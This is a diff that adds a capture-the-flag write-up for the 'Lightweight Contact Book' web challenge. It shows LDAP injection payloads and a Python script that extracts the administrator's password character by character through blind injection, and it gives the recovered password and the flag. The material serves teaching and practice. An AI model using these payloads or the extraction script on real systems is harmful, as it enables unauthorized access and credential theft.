@@ -13,6 +13,7 @@ This is my writeup for the challenges in H@cktivityCon CTF 2020, I'll try adding
   - [Bite](#bite)
   - [GI Joe](#gi-joe)
   - [Waffle Land](#waffle-land)
+  - [Lightweight Contact Book](#lightweight-contact-book)
 
 # Web
 
@@ -196,3 +197,71 @@ And we got the password, we can now login as admin and receive the flag:
 * SQL injection (SQLi): https://en.wikipedia.org/wiki/SQL_injection
 * Web Application Firewall (WAF): https://en.wikipedia.org/wiki/Web_application_firewall
 * SQLi cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+
+## Lightweight Contact Book
+Lookup the contact details of any of our employees!
+
+Connect here:\
+http://jh2i.com:50019
+
+**`flag{kids_please_sanitize_your_inputs}`**
+
+**Solution:** We again receive a url to a website with the challenge which seems...empty
+
+![](assets//images//lightweight_1.png)
+
+We have two options (again), to search and to login using a username and a password, but this time we also have the option to recover a user's password:
+
+![](assets//images//lightweight_2.png)
+
+We can try some common usernames, all of them seems to give us the message "Sorry, this functionality is currently unavailable" except for the username `administrator` which gives us the following:
+
+![](assets//images//lightweight_3.png)
+
+Okay so we have a username that is administrator...what's next? after a bit of fuzzing the search bar I got an error message:
+
+![](assets//images//lightweight_4.png)
+
+by googling the error message I discovered that this website using a protocol called LDAP for the search, LDAP or Lightweight Directory Access Protocol is a protocol for accessing directory service over the internet (directory service is a shared information infrastructure, can be thought of as a database for this challenge), in this protocol the symbol `*` stands for a wildcard and filtering is done using `(<attribute>=<value>)` and filters can be appended together. By searching for `*` we can view the display name and the email of employees, one that stand out is the employee with the display name `Administrator User`, by trying to search for `Admin*` we can see that only the row with this employee is left, so we can assume that the statement used by the search option is `(name=<search input>)` and that we need to discover the description for the employee with the name `Administrator User`.\
+A common attack against LDAP is using LDAP injection which is very similar to SQL injection, a simple example for LDAP injection is to search for `*)(mail=administrator@hacktivitycon*` the statement that will be executed by our assumption is:
+
+ `(name=*)(email=administrator@hacktivitycon.local)`
+
+ and only the employee(s) with this email will be displayed, trying that gives us:
+
+ ![](assets//images//lightweight_5.png)
+
+ and it seems that we can use LDAP injection, so we want to get the password stores in  the description of the administrator but we cannot display it so we can do something similar to blind SQL injection, by search for `Admin*)(description=<string>*` and changing the value of string character by character, we have two options:
+ * The value is the start of password and the information about the Administrator will be displayed as it matches both of the filters.
+ * The value is not the start of the password and information about the Administrator will not be displayed because it doesn't match the second filter.
+
+we can start with an empty string an go through all the characters trying to append the character to the string until information about the Admin is displayed, at this point we know that the string is the start of the password and we can try to add another character to the string by again going through all the characters and so on until we can no longer add characters, so I wrote a python script to do that:
+
+ ```python
+ import urllib.parse, urllib.request
+from string import printable
+
+password = ''
+while 1:
+	for c in printable:
+		query = 'Admin*)(description={}*'.format(password + c)
+		url = 'http://jh2i.com:50019/?search=' + urllib.parse.quote(query)
+		response = urllib.request.urlopen(url).read()
+		if b'Admin' in response:
+			password += c
+			print(password)
+			break
+ ```
+
+by running the script we get the password:
+
+![](assets//images//lightweight_6.png)
+
+and we can connect with the username `administrator` and the password `very_secure_hacktivity_pass` to receive the flag:
+
+![](assets//images//lightweight_7.png)
+
+**Resources:**
+* Lightweight Directory Access Protocol (LDAP): https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol
+* LDAP injection: https://www.synopsys.com/glossary/what-is-ldap-injection.html
+* LDAP injection cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
